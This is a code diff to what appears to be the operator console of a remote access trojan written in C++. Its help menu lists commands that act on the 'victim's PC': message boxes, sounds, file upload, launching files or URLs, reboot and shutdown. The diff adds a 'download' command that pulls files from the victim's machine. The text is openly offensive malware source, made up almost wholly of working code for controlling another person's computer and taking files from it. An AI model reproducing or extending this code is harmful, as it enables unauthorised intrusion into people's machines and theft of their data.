@@ -43,6 +43,7 @@ void help_menu()
     printf("msgbox - summon MessageBox on victim's PC\n\n");
     printf("beep <sec> - play weird sound for X sec on victim's PC\n\n");
     printf("upload <file> - send file to victim's PC\n\n");
+    printf("download <file> - download file from victim's PC\n\n");
     printf("execute <file/url> - lauch file or open url\n\n");
     printf("reboot - reboot victim's PC\n\n");
     printf("shutdown - turn off victim's PC\n\n");
@@ -192,6 +193,19 @@ int main(int argc, char* argv[])
                 } else {
                     ColoredText(F_LIGHTRED);
                     printf("[!] Usage: upload <filename>\n");
+                }
+            }
+            else if (command.substr(0, 8) == "download") {
+                if (command.length() > 8) {
+                    SendAndReceive(client, command);
+                    std::string filePath = command.substr(9);
+                    std::filesystem::path path(filePath);
+                    std::string filename = path.filename().string();
+
+                    ReceiveFile(client, filename);
+                } else {
+                    ColoredText(F_LIGHTRED);
+                    printf("[!] Usage: download <filename>\n");
                 }
             }
             else if (command.substr(0, 7) == "execute") {
